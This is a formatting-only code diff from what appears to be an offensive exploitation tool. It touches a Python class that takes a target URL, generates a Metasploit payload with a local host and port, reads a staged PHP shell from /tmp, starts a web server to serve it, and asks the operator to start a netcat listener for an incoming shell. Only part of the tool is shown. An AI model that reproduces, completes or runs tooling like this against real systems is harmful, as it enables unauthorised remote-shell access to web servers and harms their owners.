@@ -13,7 +13,6 @@ HERE = abspath(dirname(__file__))
 
 class Data:
     def __init__(self, args):
-
         self.target = args.url
         self.nostager = args.nostager
         self.cookies = args.cookies
@@ -37,7 +36,7 @@ class Data:
             return
 
         lhost, lport, shell = msf_payload()
-        file  = join(HERE, "Server.py")
+        file = join(HERE, "Server.py")
         if self.nostager:
             with open("/tmp/{0}.php".format(shell), "r") as f:
                 payload = f.read()
@@ -58,12 +57,19 @@ class Data:
             print(colors("[~] Starting Web Server ... ", 93))
 
             try:
-                p = subprocess.Popen(["python3 {}".format(file)], shell=True, stdout=subprocess.PIPE)
+                p = subprocess.Popen(
+                    ["python3 {}".format(file)], shell=True, stdout=subprocess.PIPE
+                )
                 p.communicate()
             except OSError as e:
-                print(colors("[!]Process Error",91))
+                print(colors("[!]Process Error", 91))
 
-        input(colors("[?] Press Enter To Continue When Your netcat listener is Running ...", 94))
+        input(
+            colors(
+                "[?] Press Enter To Continue When Your netcat listener is Running ...",
+                94,
+            )
+        )
 
         if self.cookies:
             cookies = cook(self.cookies)
